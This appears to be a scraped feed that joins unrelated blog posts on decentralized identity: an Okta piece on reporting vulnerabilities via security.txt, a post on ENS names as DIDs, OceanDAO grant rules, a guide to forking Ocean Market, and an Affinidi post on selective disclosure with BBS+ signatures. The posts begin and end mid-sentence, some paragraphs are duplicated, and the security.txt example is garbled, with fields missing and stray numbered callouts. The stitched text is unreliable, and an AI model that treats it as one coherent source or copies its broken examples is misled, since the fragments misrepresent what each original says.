Dock. It is a key strategic imperative for Credenxia to offer existing and new clients a decentralised option that maintains highest levels individual data privacy and integrity. Dock has led the way, by releasing the first public W3C credential verifier, which utilises the Verifiable Credentials Data Model (VCDM). Meeting the highest global standard in what will be a rapidly evolving digital compliance landscape is essential for our future growth roadmap. Following the PoC, I am confident that the Dock framework will support these objectives.”</p>

 We all know that all software has bugs and that security is hard, but somehow we are still surprised when we see new vulnerabilities. 
 
 
 
 
 
 Vulnerability 
 
 A bug, flaw, weakness, or exposure of an application, system, device, or service

<p>We all know that all software has bugs and that security is hard, but somehow we are still surprised when we see new vulnerabilities.</p>
 
 
 
 
 
 Vulnerability 
 
<p>A bug, flaw, weakness, or exposure of an application, system, device, or service
that could lead to a failure of confidentiality, integrity, or availability.</p>
 
 
 
 
 
 
<p>In 2020, there were 18,395 vulnerabilities reported, which means about 50 new vulnerabilities are reported every day. These numbers only include what has been reported to MITRE’s Common Vulnerability and Exposures (CVE) database, which means the actual value is likely much higher. Every year we add more software to the world, so these numbers will only increase. I didn’t list this number here to scare you; more so, they are a fact of life, and we all need to be aware of how to deal with them.</p>
 
 
 Reporting Vulnerabilities 
 
 
<p>Vulnerabilities are NOT handled the same way as a typical software bug. A properly handled vulnerability is reported privately to the project’s maintainers, then fixed and released before any information about the vulnerability is made public. It may seem like a good idea to report a security issue on GitHub Issues, but it isn’t! Handling vulnerabilities privately may seem counter-intuitive, especially for open-source projects where everything is public, but this isn’t just good manners, even more importantly it reduces potential exposure for everyone using the project.</p>
 
 
<p>Okay, so if not a public issue tracker, then where do you report the issue?</p>
 
 
 
 
 Where do you report a vulnerability 
 
 
<p>The actual "where do you report a vulnerability" is where things get complicated; every project and company has a different process to handle vulnerabilities. Figuring out who to report an issue to is often an exercise in frustration; try to browse a website, do a Google search, maybe even look on bug bounty sites like <a href="https://www.hackerone.com/">HackerOne</a> or <a href="https://www.bugcrowd.com/">Bugcrowd</a>. There is an easier way! Enter <a href="https://securitytxt.org/"><code>security.txt</code></a>, a <a href="https://datatracker.ietf.org/doc/html/draft-foudil-securitytxt-12">draft RFC</a>, that aims to standardize a method for security policies to be discovered.</p>
 
 
<p>Defining a <code>security.txt</code> is easy. Create a small <code>.well-known/security.txt</code> file at the root of your domain containing your security team’s contact information. There is even a form on <a href="https://securitytxt.org/">securitytxt.org</a> that will generate one for you in a few seconds!</p>
 
 
<p>For example, Okta’s <a href="https://www.okta.com/.well-known/security.txt">https://www.okta.com/.well-known/security.txt</a> is:</p>
 
 
 
 <code>Contact: mailto:security@okta.com (1)
Expires: 2023-01-01T05:00:00.000Z (2)

# Optional Fields

2
A date when to consider this data stale.


3
List of languages the security team prefers.


4
Link back to a reporting policy page with more details.


5
Even a link back to relevant job postings.


 
 
<p>The contents of the <code>security.txt</code>, a quick summary of who to contact and where to go to find more information, is not a replacement for existing security policy pages. Still, it can contain additional information such as a company’s PGP keys, acknowledgments, and canonical URL information.</p>
 
 






 
<p>If you are familiar with <a>OpenID Connect</a>, the <code>.well-known</code> part of the above URL may look familiar to you. "Well Known URIs" are defined by <a href="https://www.rfc-editor.org/rfc/rfc8615.html">RFC-8615</a>, and there is an official <a href="https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml">IANA registry</a> containing a variety of entries, everything from Tor Relay information to IoT protocols. The goal of all of these individual "well-known" endpoints is to make it easy to discover metadata about a specific service.</p>

<p>In general, your users are trying to get something done, and they see reading the manual as a waste of time, or at the very least, as a distraction that keeps them from getting their task done.</p>

<p>If your project uses a public bug tracker (like GitHub Issues), information about handling security issues needs to be obvious to the reporter. One way to do this is to define a <a href="https://docs.github.com/en/code-security/getting-started/adding-a-security-policy-to-your-repository"><code>SECURITY.md</code></a> file and create <code>ISSUE_TEMPLATE.md</code>; that way it’s the first thing the reporter sees when the file an issue. For example, the Spring Security <a href="https://raw.githubusercontent.com/spring-projects/spring-security/main/.github/ISSUE_TEMPLATE.md">issue template</a> starts with:</p>
 
 
 
 <code>&lt;!--
For Security Vulnerabilities, please use https://pivotal.io/security#reporting
--&gt;</code> 
 
 
 






What makes this so clever is the HTML comment; only the reporter sees the comment when opening an issue. It doesn’t get displayed when the Markdown is rendered!

<p>Most folks don’t know that vulnerabilities require special handling; it isn’t taught in a typical university computer science curriculum or coding bootcamp. Information about how to report security issues needs to be obvious and easily discoverable.</p>

   Decentralized Identifiers (DIDs) are a new type of unique identifiers that can be controlled solely by the user. With zero transaction costs, users can easily create their own DIDs.

<p><a href="https://www.w3.org/TR/did-core/">Decentralized Identifiers (DIDs)</a> are a new type of unique identifiers that can be controlled solely by the user. With zero transaction costs, users can easily create their own DIDs. They will then be able to prove control over their DID and allow counterparties to find their public encryption key, signature verification key and public services. Those services can be used to interact with the user’s&nbsp;DID.</p><p>The DID specification has matured over the last couple of years and is about to become a formal W3C standard. It defines a universal abstract data model representation for identifiers and their verification material (e.g. public keys), relationships and services. The specification is extensible by design which means new types of services, verification materials and other features can be supported. In the core, the specification contains a simple interface to resolve a DID Document from a DID (similar to an Ethereum Account from an ENS name) by anyone who knows the DID of the user. The DID Document will then contain the relevant information to enable use cases such as sign up, sign in, data encryption, secure communication, verifiable authorship and data provenance etc. Since DIDs are URI-compliant, they also make perfect sense for web ontologies.</p><p>For the Decentralized Identity (or Self-Sovereign Identity) Community in the <a href="https://identity.foundation/">Decentralized Identity Foundation (DIF)</a>, <a href="https://ec.europa.eu/cefdigital/wiki/display/CEFDIGITAL/EBSI">European Blockchain Services Infrastructure (EBSI)</a>, <a href="https://www.hyperledger.org/use/aries">Hyperledger Aries</a>, W3C and <a href="https://openid.net/wordpress-content/uploads/2021/09/OIDF_OIDC4SSI-Update_Kristina-Yasuda-Torsten-Lodderstedt.pdf">OIDC4SSI</a> in <a href="https://openid.net/">OpenID Foundation (OIDF)</a> and many others, DIDs have been a central component and building block for user-centric identity solutions for&nbsp;years.</p> Other DID-like Identifiers&nbsp;… <p>However, the Ethereum community is exploring other identifiers like NFTs and <a href="https://ens.domains/">Ethereum Name Service (ENS)</a> as identifiers (as a byproduct) with similar goals as DIDs in mind. Both can be created and solely controlled by the user. ENS is a distributed, open, and extensible naming system based on the Ethereum blockchain. ENS’s job is to map human-readable names like ’vitalik.eth’ to machine-readable identifiers such as Ethereum addresses and metadata.</p><p>A lot of Web3 users have been using ENS names as their identifiers (see <a href="https://etherscan.io/enslookup">Etherscan</a>). Also <a href="https://www.coindesk.com/tech/2021/09/23/twitter-to-add-bitcoin-lightning-tips-nft-authentication/">Twitter is experimenting lately with NFTs</a> and therefore ENS names since they comply with the <a href="https://eips.ethereum.org/EIPS/eip-721">EIP-721</a> standard. We can expect more traction in the near&nbsp;future.</p> ENS names are now DIDs&nbsp;… <p>DIDs are not a replacement for Ethereum Accounts and ENS. Instead, DIDs can be seen as an abstract representation of those which makes it easier for developers to build applications across different chains and platforms. Many developers in the Decentralized Identity Community are already building a lot of Open Source tooling/products and protocols facilitating trust, privacy, security and data sovereignty, to integrate with the Ethereum ecosystem and vice versa. Some of the Open Source components include decentralized agents (e.g. <a href="https://veramo.io/">Veramo</a>), secure communication (i.e. <a href="https://identity.foundation/didcomm-messaging/spec/">DIDComm Messaging</a>), capabilities-based authorization and delegation frameworks (e.g. <a href="https://w3c-ccg.github.io/zcap-ld/">ZCaps</a>), login w/ identity wallets (i.e. <a href="https://openid.net/specs/openid-connect-self-issued-v2-1_0.html">SIOPv2</a>), user-controlled confidential (e.g. <a href="https://www.spruceid.com/kepler">Kepler</a>) or public storage (e.g. <a href="https://ceramic.network/">Ceramic</a>) and&nbsp;more.</p><p>DID-based representations for Ethereum Accounts have been already defined and used. Examples&nbsp;include:</p>  did:ethr:mainnet:0xb9c5714089478a327f09197987f16f9e5d936e8a  did:safe:0xff6229bc3655cf0204e850b54397d3651f5198c4_eip155.1  did:pkh:eth:0xb9c5714089478a327f09197987f16f9e5d936e8a  <p>We have now defined a DID-representation for ENS names such&nbsp;as:</p>  did:ens:mainnet:vitalik.eth  <p>This has two purposes:</p>  to wrap existing ENS names as DIDs to facilitate interoperability of emerging technologies in the Decentralized Identity and Ethereum community,  to define a canonical way to augment ENS names with DID capabilities (e.g., encryption) as mentioned above.  <p>We have already officially registered a DID method specification for <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> in the <a href="https://www.w3.org/TR/did-spec-registries/#did-methods">W3C DID registry</a> and are now looking for an appropriate home of the specification for further development. We are happy to donate the specification including the <a href="https://github.com/veramolabs/ens-did-resolver">ens-did-resolver</a> implementation.</p><p>Now, every ENS name can be represented as a DID with no extra steps. The default DID Document will always contain the ENS registry as the public profile service and the current owner of the ENS name as the controller of the DID which already enables use cases such as issuing and proving control of verifiable attestations (i.e. based on W3C Verifiable Credentials) which can be used for sign up and sign&nbsp;in.</p><p>Through the ENS registry, standardized TEXT records (as defined in the <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> specification) can be added to the ENS name to enable more DID-like features, e.g., encryption, delegation, confidential storage, communication etc.</p><p>For example, to enable encryption for a <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> DID, just add the following TEXT records to your ENS name (see did:ens:ropsten:<a href="https://app.ens.domains/name/awoie.eth">awoie.eth</a>):</p>ENS Text Records for&nbsp;DIDs<p>You can now use <a href="https://github.com/veramolabs/did-ens-spec">did:ens</a> with <a href="https://veramo.io/">Veramo</a> or the <a href="https://github.com/decentralized-identity/did-resolver">did-resolver</a> in your own projects.</p><p>Using DIDs as a standard representation for Decentralized Identifiers will increase interop and synergies between different platforms, chains, applications and communities.</p><p>Wanna talk about how to use ENS names as DIDs? <a href="https://discord.gg/Er4E5xRdPj">Join our&nbsp;Discord</a></p> <p><a href="https://medium.com/uport/ens-names-are-decentralized-identifiers-dids-724f0c317e4b">ENS names are Decentralized Identifiers (DIDs)</a> was originally published in <a href="https://medium.com/uport">uPort</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

For example, New Teams (non-outreach) have 60,000 OCEAN available as “air cover” without having to compete against other groups. Beyond that, they have to&nbsp;compete.</p>  60,000 OCEAN for New Teams (non-outreach category)  30,000 OCEAN for New Teams (outreach category)  30,000 OCEAN for Core Tech Initiatives (listed&nbsp;below)  380,000 OCEAN for remaining General&nbsp;Grants  <p>Core Tech Initiatives</p><p>Proposals that work on any of the following fall under the “Core Tech Initiatives” earmark, for air cover when&nbsp;voting.</p>  Enhance Ocean’s Fine-Grained Permissions to support Verifiable Credentials (vs just Ethereum addresses) in allowlist and denylist. (The schema already allows&nbsp;it.)  First-class integration with WebSockets as a data service. It would include a fork of Ocean Provider, plus affordances elsewhere in the&nbsp;stack.  First-class integration with Arweave as a data service. It may already have some support; this needs to be validated. Then the aim is to remove friction and leverage Arweave more fully. It may be as a fork of Ocean Provider, and/or elsewhere in the&nbsp;stack  First-class integration with Filecoin as a data service. It already supports via IPFS; the aim here is to remove friction and leverage Filecoin more fully. It may be as a fork of Ocean Provider, and/or elsewhere in the&nbsp;stack  <p>Burn</p><p>As with DAO Rounds 8, 9, and 10, any remaining funds not granted in Round 11 will be burned. <a href="https://blog.oceanprotocol.com/on-voting-in-oceandao-8f7e07d40e9d">Here’s how burning relates to voting in OceanDAO</a>.</p><p>Rules:</p>  [Earmarked Grants] winners are counted&nbsp;first.  Projects that do not win an [Earmarked Grant] are then considered for funding under the [General Grant] category.  [New] teams are thus eligible to be funded from both [Grant Category].  Returning teams are eligible to be funded from [General&nbsp;Grants].  50% or more “Yes” Votes receive a&nbsp;grant.  Any remaining funds not granted, are&nbsp;burned.  <p>Voting Parameters</p><p>OceanDAO is a nascent monthly grants program and has a lot of mechanisms still being designed and developed. The OceanDAO roadmap aims to deliver stable systems for existing and future participants across: voting and funding. It has also been designed to improve voter &amp; token holder representation.</p><p>Whilst Quadratic Voting is a key deliverable for OceanDAO, Sybil vector attacks cannot be taken lightly. Which is why intermediary steps have to be taken before moving to QV, so as to avoid the following:</p>  Willingly create an opportunity for a Sybil&nbsp;attack  Overlook a well-orchestrated attack  Become a central authority in grant-voting outcomes  Fracture voter &amp; grantee participation.  <p>There are 2 major improvements being rolled out for OceanDAO Round 11. The key concept is that these changes are designed to reduce the impact of whale voters, increase the impact of voter representation, and make the process easier to navigate for all participants.</p><p>Single Ballot:</p>  All Grant Proposals will now be listed in a single voting ballot together (as opposed to each proposal having their own Y/N&nbsp;ballot)  OCEAN can only be used to vote once (as opposed to each proposal’s Y/N ballot being voted on with your full OCEAN&nbsp;amount).  <p>Weighted-Ballot System:</p>  Voters will be able to use OCEAN&nbsp;once  Voters will be able to distribute their votes across several&nbsp;projects  1 OCEAN = 1&nbsp;Vote  <p>Note that we are still moving towards QV, which is currently implemented on Snapshot. Also, going forward, we will be deploying digital identification (DID), snapshot strategies that support this, and the required UX to reduce friction, and reduce sybil attack&nbsp;vectors.</p><p>Town Hall</p><p><a href="https://github.com/oceanprotocol/oceandao/wiki/OceanDAO-Town-Hall">Town Hall</a> has been running weekly since the beginning of OceanDAO. Currently the DAO is expanding and with this growth so will the Town&nbsp;Hall.</p><p>Town Hall will widen its scope and begin to include the entire Ocean Ecosystem.

Introduction <p>Have you ever thought about monetising the data that your organisation generates? You might imagine that this involves dealing with data brokers, but with Ocean you can sell your data directly to your customers with no third party in-between. Ocean makes this all super easy for you with some pretty cool tech under the&nbsp;hood.</p><p>Using <a href="https://market.oceanprotocol.com/">Ocean Market</a> is already a big improvement on the alternatives that are out there, but it gets even better. Ocean Market is completely open-source and made freely available under the Apache 2 license. This means that you can fork Ocean Market and set up your own data marketplace in just a few steps. This guide will walk you through the process, you’ll be surprised how easy it is. No prior blockchain knowledge is required!</p> 2. Before You&nbsp;Begin <p>If you’re completely unfamiliar with Ocean Market or web3 applications in general, you will benefit from reading these guides&nbsp;first:</p>  To use your clone of Ocean Market, you’ll need a <a href="https://docs.oceanprotocol.com/tutorials/wallets/">wallet</a>. We recommend <a href="https://docs.oceanprotocol.com/tutorials/metamask-setup/">getting set up with metamask</a>.  You’ll also need some <a href="https://docs.oceanprotocol.com/tutorials/wallets-and-ocean-tokens/">Ocean tokens on a testnet</a> to use your marketplace.  When you have the testnet tokens, have a go at <a href="https://docs.oceanprotocol.com/tutorials/marketplace-publish-data-asset/">publishing a data asset</a> on Ocean&nbsp;Market.  Now run through the process of <a href="https://docs.oceanprotocol.com/tutorials/marketplace-consume-data-asset/">consuming a data asset</a> on Ocean&nbsp;Market.   3. Required Prerequisites <p>Make sure that you have all of the necessary prerequisites:</p>  Git. Instructions for installing Git can be found&nbsp;<a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">here</a>.  Node.js can be downloaded from <a href="https://nodejs.org/en/download/">here</a> (we’re using version 16 in this&nbsp;guide)  A decent code editor, such as <a href="https://code.visualstudio.com/">Visual Studio&nbsp;Code</a>  You’ll need a Github account to fork Ocean market via&nbsp;<a href="https://github.com/">Github</a>.  <p>In addition to the above list, knowledge of <a href="https://www.w3schools.com/css/">CSS</a> will help you make a quick start to adjusting the styling and prior experience with <a href="https://reactjs.org/">React</a> will help but isn’t required.</p> 4. Quickstart: Data Marketplace up and running in under 1&nbsp;hour!  4.1 Fork Ocean&nbsp;Market <p>The first step is to log into Github and navigate to <a href="https://github.com/oceanprotocol/market">https://github.com/oceanprotocol/market</a>, you’ll need to log in or create a Github account. Now you need to click “Fork” in the top right-hand corner. If you are a member of an organisation on Github, it will give you the option to clone it into either your personal account or the organisation, choose whichever is suitable for&nbsp;you.</p> 4.2 Clone the market&nbsp;locally <p>Now we need to clone the market fork locally so that we can start making changes to the code. Upon forking Ocean Market, GitHub will take you to the repository page. Here, you should copy the URL of the repository. To do this, click on the green “Code” button and then click the copy icon to copy the HTTPS URL. Make sure that you have git installed and set up and installed on your computer before proceeding, see <a href="https://git-scm.com/book/en/v2/Getting-Started-Installing-Git">this</a> guide if you’re not familiar with&nbsp;git.</p><p>Now you’re ready to make a local clone of your forked version of the Ocean Market. Open up the terminal, or command prompt on Windows. At this point, you may wish to navigate to the directory where you want this repository to live `cd Desktop` for example, but it’s also perfectly fine to clone it in the home directory.</p><p>To clone the repository, enter the following command into your terminal:</p> git clone <a href="https://github.com/your-profile/market.git">https://github.com/your-profile/market.git</a> <p>You need to replace the link with the HTTPS URL that you copied from GitHub. Once you enter the command, you’ll see the percentage completion reported, and then git will let you know when it’s done. Now let’s navigate into the market directory that we have just&nbsp;cloned:</p> cd market  4.3 Install the dependencies <p>Installing the dependencies is a vital step for running the market. It’s a super simple process, thanks to npm (node package manager). Make sure you have node.js installed, otherwise it will fail. In Ocean Market, we use node.js version 16 and it’s highly recommended that you use the&nbsp;same.</p><p>Enter the following command to install the dependencies:</p> npm install <p>This command will take a few minutes to complete and you’ll see some warnings as it runs (no need to worry about the warnings).</p> 4.4 Run your Market fork for the first&nbsp;time <p>At this point, you are ready to run your data marketplace for the first time. This is another straightforward step that requires just one&nbsp;command:</p> npm start <p>The above command will build the development bundle and run it locally. Once it’s complete you should see the following output:</p><p>Great news — your data marketplace has successfully been built and is now running locally. Let’s check it out! Open your browser and navigate to <a href="http://localhost:8000/">http://localhost:8000/</a>. You’ll see that you have a full-on clone of Ocean Market running locally. Give it a go and test out publishing and consuming data assets — everything works!</p><p>That’s all that’s required to get a clone of Ocean market working. The whole process is made simple because your clone can happily use all the smart contracts and backend components that are maintained by Ocean Protocol Foundation.</p><p>So you’ve got a fully functioning data marketplace at this point, which is pretty cool. But it doesn’t really look like your data marketplace. Right now it’s still just a clone of Ocean Market — same branding, name, logo etc. The next few steps focus on personalising your data marketplace.</p> 4.5 Change your Market&nbsp;Name <p>It’s now time to open up your favourite code editor and start getting stuck into the code. The first thing we will be doing is changing the name of your data marketplace. A decent code editor (such as VS Code) makes this incredibly simple by searching and replacing all the places that the name&nbsp;appears.</p><p>Let’s start by searching and replacing “Ocean Marketplace”. In VS Code there is a magnifying glass symbol in the left-hand panel (arrow 1 in the image below) that will open up the interface for searching and replacing text. Type “Ocean Marketplace” into the first textbox, and the name of your marketplace into the second textbox (arrow 2). To make things simple, there is a button to the right of the second textbox (arrow 3) that will replace all instances at once. You can take a moment to review all the text you’re changing if you wish and then click this&nbsp;button.</p><p>Next up, we need to repeat the process but this time we’ll be searching and replacing “Ocean Market”. As you can see in the screenshot below, we have called our fork “Formidable Data&nbsp;Market”.</p><p>Now let’s change the tagline of your site. Open up the folder called “content” and then open the file called “site.json”.</p><p>On line 4 in this file, you can enter the tagline that you want for your data marketplace.</p> 4.6 Change the&nbsp;Logo <p>The next important step to personalising your data marketplace is setting your own logo, we highly recommend using your logo in SVG format for this. The site logo is stored in the following location:</p> src/images/logo.svg <p>Delete the “logo.svg” file from that folder and paste your own logo in the same folder. If you rename your logo “logo.svg” everything will work without any problems.</p><p>At this point, it’s a good idea to check how things are looking. First, check that you have saved all of your changes, then cancel the build that’s running in your terminal (Ctrl + C or Cmnd + C) and start it again `npm start`. Once the build has finished, navigate to <a href="http://localhost:8000/">http://localhost:8000/</a> and see how things&nbsp;look.</p><p>As you can see in the screenshot above, changing the site name and tagline has worked well. However, our logo doesn’t look quite right… To fix this, open up the Logo.module.css file from src/components/atoms/Logo.module.css. In this file, you can see the styling that is being applied to your&nbsp;logo.</p><p>Delete lines 7, 8 and 9 and save the file. Now open up <a href="http://localhost:8000/">http://localhost:8000/</a>and refresh the page (no need to restart the build&nbsp;here).</p><p>Awesome! Now our logo is fixed and looking&nbsp;great.</p> 4.7 Change the&nbsp;Styling <p>Hopefully, you like our pink and purple branding but we don’t expect you to keep it in your own data marketplace. This step focuses on applying your own brand colours and&nbsp;styles.</p><p>4.7.1 Background</p><p>Let’s start with the background. Open up the following CSS&nbsp;file:</p> src/components/App.module.css <p>You’ll notice in the screenshot above that we are setting our “wave” background on line 3. Here, you’ll want to use your own background colour or image. For this example, we’ll use an SVG background from <a href="https://www.svgbackgrounds.com/">svgbackgrounds.com</a>. We save the new background image into the src/images/ folder (same folder as the logo), then we change the CSS to the file location of the new background (see line 3 in the image&nbsp;below).</p><p>If we save this file and view the site at this point, we get an ugly white section at the top (see image&nbsp;below).</p><p>To fix this we need to change the starting position of the background image. In this situation, we can just delete “13.rem” from line&nbsp;3.</p><p>Now when we view our data marketplace we can see that the new background starts at the top and fills the whole page.&nbsp;Perfect!</p><p>4.7.2 Brand&nbsp;Colours</p><p>Next up, let’s change the background colours to match your individual style. Open up the following file: src/global/_variables.css. Here you’ll see the global style colours that are set. Now is the time to get creative, or consult your brand handbook (if you already have&nbsp;one).</p><p>You can change these colours as much as you wish until you’re happy with how everything looks. Each time you save your changes, the site will immediately update so you can see how things look. You can see the styles chosen for this example in the image&nbsp;below.</p><p>And the screenshot below shows how it’s currently looking.</p><p>4.7.3 Change&nbsp;Fonts</p><p>The final part of the styling that we’ll alter in this guide is the fonts. This is an important step because the font used in Ocean Market is one of the few elements of the market that are copyright protected, if you want to use the same font you’ll need to purchase a license. The other copyrighted elements are the logo and the name — which we have already&nbsp;changed.</p><p>If you don’t already have a brand font, head over to <a href="https://fonts.google.com/">Google Fonts</a> to pick some fonts that suit the brand you’re trying to create. Google makes it nice and easy to see how they’ll look and it’s simple to import them into your&nbsp;project.</p><p>The global fonts are set in the same file as the colours, scroll down and you’ll see them on lines 36 to&nbsp;41.</p><p>If you are importing fonts, such as from Google fonts, you need to make sure that you include the import statement at the top of the _variables.css file (Google Fonts provides you with this import statement so you just need to copy and paste&nbsp;it).</p><p>As with the colour changes, it’s a good idea to save the file with each change and check if the site is looking the way that you expected it to. You can see our eclectic choices&nbsp;below.</p><p>4.8 Change the Fee&nbsp;Address</p><p>At this point, we have made a lot of changes and hopefully you’re happy with the way that your data marketplace is looking. Given that you now have your own awesome data marketplace, it’s about time we talked about monetizing it. Yeah, that’s right — you will earn a commission when people buy and sell data assets on your marketplace.</p><p>When someone sets the pricing for their data assets in your marketplace they are informed that a commission will be sent to the owner of the data marketplace. In order to receive this commission, you need to set the market to send the commission through to your Ethereum&nbsp;address.</p><p>This important step is the last thing that we will change in this guide. To change the address that the marketplace fees are sent to you need to set your address as an environmental variable. Create a new file called&nbsp;.env in the root of your repository. It is important that the file is saved in the right place, your file structure should look the same as&nbsp;below.</p><p>Now copy and paste the following into the&nbsp;file:</p> GATSBY_MARKET_FEE_ADDRESS=”0xxx” <p>You need to replace “0xxx” with your Ethereum address and save the file. And that’s it, you now have a fully functioning data marketplace that will earn you revenue every time someone uses&nbsp;it.</p> 4.9 Build and host your Data Marketplace <p>All that’s left is for you to host your data marketplace and start sharing it with your future users. To host your data marketplace you need to run the build&nbsp;command:</p> npm run build <p>This takes a few minutes to run. While this is running you can get prepared to host your new data marketplace. You have many options for hosting your data marketplace (including AWS S3, Vercel, Netlify and many more). In this guide, we will demonstrate how to host it with <a href="https://surge.sh/">surge</a>, which is completely free and very easy to&nbsp;use.</p><p>Open up a new terminal window and run the following command to install&nbsp;surge:</p> npm install — global surge <p>When this is complete, navigate back to the terminal window that is building your finished data marketplace. Once, the build is completed enter the following commands to enter the public directory and host&nbsp;it:</p> cd public  Surge <p>If this is your first time using surge, you will be prompted to enter an email address and password to create a free account. It will ask you to confirm the directory that it is about to publish, check that you are in the market/public/ directory and press enter to proceed. Now it gives you the option to choose the domain that you want your project to be available on. We have chosen <a href="https://formidable-data-market.surge.sh/">formidable-data-market.surge.sh</a> which is a free option. You can also set a CNAME value in your DNS to make use of your own <a href="https://surge.sh/help/adding-a-custom-domain">custom&nbsp;domain</a>.</p><p>After a few minutes, your upload will be complete and you’re ready to share your data marketplace. You can view the version we created in this guide&nbsp;<a href="https://formidable-data-market.surge.sh/">here</a>.</p> 5. Conclusion <p>Well done for making it to the end of this guide. We’ve covered all of the most important steps for getting your own data marketplace setup:</p>  Forking Ocean&nbsp;Market  Changing the&nbsp;Logo  Setting the name and tagline for your data marketplace.  Customising the styling using your own fonts, colours and background.  Setting your own Ethereum address as an environmental variable to receive the marketplace fees.  Building and publishing your data marketplace.  <p>Hopefully you’ve enjoyed this guide and found it productive.

So, how can Vince prove his age without disclosing any other personal information?</p><p>Think about it for a&nbsp;moment.</p><p>This is where <a href="https://academy.affinidi.com/selective-disclosure-share-what-you-want-8ae367655b7b">selective disclosure</a> comes into play.&nbsp;.</p> What is Selective Disclosure? <p>Selective disclosure is one of the pillars of <a href="https://academy.affinidi.com/self-sovereign-identity-what-you-can-cant-do-with-ssi-1284f7227b4e">Self-Sovereign Identity</a> and it enables individuals to share just what is needed by the recipient to process the data and take actions based on&nbsp;it.</p><p>In the above example, selective disclosure allows Vince to share just his age with the security as that alone is enough to decide if he should be allowed to enter the casino or&nbsp;not.</p> Benefits of Selective Disclosure <p>The benefits of selective disclosure are:</p>  Enhances the privacy of the user as minimum information is exchanged  Empowers users to determine what data must be shared with&nbsp;whom.  Reduces processing time for the recipients as only a small set of information has to be verified.  No storing and the related <a href="https://academy.affinidi.com/can-ssi-safeguard-your-information-from-hackers-1b256d3eb6cd">security</a> hassles for recipients  <p>Now that you know what selective disclosure is and its associated benefits, let’s jump to its implementation.</p> How Does Selective Disclosure Work? <p>One of the best ways to implement selective disclosure is through <a href="https://academy.affinidi.com/what-are-verifiable-credentials-79f1846a7b9">Verifiable Credentials (VCs)</a>, a tamper-proof and cryptographically-verifiable way of sharing Personally Identifiable Information.</p><p>Here is what a VC looks&nbsp;like.</p><p>There are three entities to a VC and they are issuer, holder, and verifier, and together, they form what’s called a <a href="https://academy.affinidi.com/what-is-the-trust-triangle-9a9caf36b321">trust triangle</a>. A VC will have the three key components, namely,</p>  Metadata that identifies the issuer and the&nbsp;holder  Claim, which is the data that a holder wants to share with the&nbsp;verifier  Proof that includes digital signatures of both the issuer and the holder for authenticity.  <p>Let’s look closely at the claim, as this is where selective disclosure is implemented.</p><p>In the above example, there is only a single claim, that the holder is an alumni of a specific institution.</p><p>Let’s look at another&nbsp;VC.</p> {  <a href="http://twitter.com/context">“@context</a>”: [<br>     <br>   <a href="http://schema.org/">“http://schema.org/</a>",<br>   <a href="https://w3id.org/security/v2">“https://w3id.org/security/v2</a>",<br>   <a href="https://w3id.org/security/bbs/v1">“https://w3id.org/security/bbs/v1</a>"  ],  <a href="http://twitter.com/type">“@type</a>”: “Person”,  “firstName”: “Jane”,  “lastName”: “Doe”,  “jobTitle”: “Professor”,  “telephone”: “(425) 123–4567”,  “email”: “jane.doe@example.com”,  “proof”: {     “type”: “BbsBlsSignature2020”,     “created”: “2020–04–25”,     “verificationMethod”: “did:example:489398593#test”,     “proofPurpose”: “assertionMethod”,     “proofValue”:   “F9uMuJzNBqj4j+HPTvWjUN/MNoe6KRH0818WkvDn2Sf7kg1P17YpNyzSB+CH57AWDFunU13tL8oTBDpBhODckelTxHIaEfG0rNmqmjK6DOs0/ObksTZh7W3OTbqfD2h4C/wqqMQHSWdXXnojwyFDEg==”,     “requiredRevealStatements”: [4,5]   }  } <p>This contains a ton of information about the holder such as firstname, last name, job title, email, etc. Many times, the holder may not have to share all this information with potential verifiers. At the same time, an issuer may find it cost-effective and convenient to issue these credentials in one&nbsp;go.</p><p>So, how do you balance between what the issuer offers and what the holder&nbsp;wants?</p><p>You guessed it — selective disclosure!</p><p>When an issuer creates and sends a verifiable credential, the holder stores it in his or her digital wallet. When it is time to share it with the verifier, the holder compiles the required credentials together into a verifiable presentation and sends it to the verifier.</p><p>Every time, when a holder shares a verifiable presentation with the verifier, he or she digitally signs it using public-key cryptography. Essentially, the holder signs with his or her private key and the verifier decrypts this information with the associated public&nbsp;key.</p><p>Likewise, the verifiable presentation will also contain the issuer’s digital signature that is signed using its private&nbsp;key.</p><p>Now, you may wonder how the holder can store each credential separately and compile it separately to have the issuer’s signature on each of&nbsp;it.</p><p>To make the question clear, in the above example, let’s say the holder shares only the phone number with a verifier. This is selective disclosure. But how will the issuer’s signature that applies to all of the credentials can be used for just one? Isn’t it a single block of content to which the entire signature applies?</p><p>Well, that’s where <a href="https://academy.affinidi.com/deciphering-bbs-signatures-e853bbf437bf">BBS+ signatures</a> come&nbsp;in.</p> Implementing Selective Disclosure using BBS+ signatures <p>BBS+ signatures are a good way to implement selective disclosure as it allows the holder to share a part of a verifiable credential with a verifier.</p><p>The above verifiable credential of Jane Doe is an example of selective disclosure as it uses BBS+ signatures. Here is the line that shows this for&nbsp;you.</p> “type”: “BbsBlsSignature2020”, <p>As a result, the holder can send just her phone number to a verifier, her email address to another entity, and so on, and all of it will have the same digital signature.</p> Affinidi’s Implementation of Selective Disclosure <p>At Affinidi, we have implemented the BBS group signature schema on our <a href="https://www.affinidi.com/api#">tech stack</a> to give holders the flexibility to build a presentation with only the required fields from a credential. These fragments are cryptographically verifiable as they are signed by the BBS+ signature.</p><p>Specifically, we have created an API to create and share the URL for the VC fragment.</p><p>The createShareUrl is the API that enables selective disclosure in Affinidi’s tech stack. It takes credentialID as a required parameter and optional selective disclosure fields array to build fragment VCs. Of course, the chosen VC should support selective disclosure.</p><p>If this parameter is provided and the VC supports selective disclosure — the fragment from VC will be builded first and then shareUrl will be created for&nbsp;it.</p><p>To learn more about this API and how you can leverage, reach out to us on <a href="https://discord.com/invite/ffV5ctBMXr">Discord</a> or <a href="http://developers@affinidi.com">email us</a>.

